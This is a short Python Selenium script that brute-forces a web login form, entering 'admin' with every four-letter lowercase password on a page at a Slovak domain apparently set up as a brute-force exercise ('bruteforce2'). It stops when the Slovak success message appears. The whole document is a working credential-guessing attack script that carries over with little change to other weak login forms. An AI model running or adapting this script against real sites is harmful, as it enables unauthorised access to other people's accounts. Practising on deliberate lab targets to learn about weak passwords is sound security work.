from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
import string

driver = webdriver.Chrome()

alphabet = string.ascii_lowercase
print(alphabet)


driver.get('https://dudo.gvpt.sk/bruteforce2/index.php')

for i in alphabet:
    for j in alphabet:
        for k in alphabet:
            for l in alphabet:
                heslo = i + j + k + l
                print(f"Trying password: {heslo}")

                
                username_field = driver.find_element(By.NAME, "username") 
                password_field = driver.find_element(By.NAME, "password") 

                username_field.clear()
                password_field.clear()

                username_field.send_keys('admin')
                password_field.send_keys(heslo)

               
                password_field.send_keys(Keys.RETURN)

                if 'Úspešne si sa prihlásil' in driver.page_source:
                    print(f"Successfully logged in with password: {heslo}")
                    driver.quit()  
                    exit()

                else:
                    print(f"Login failed with password: {heslo}")
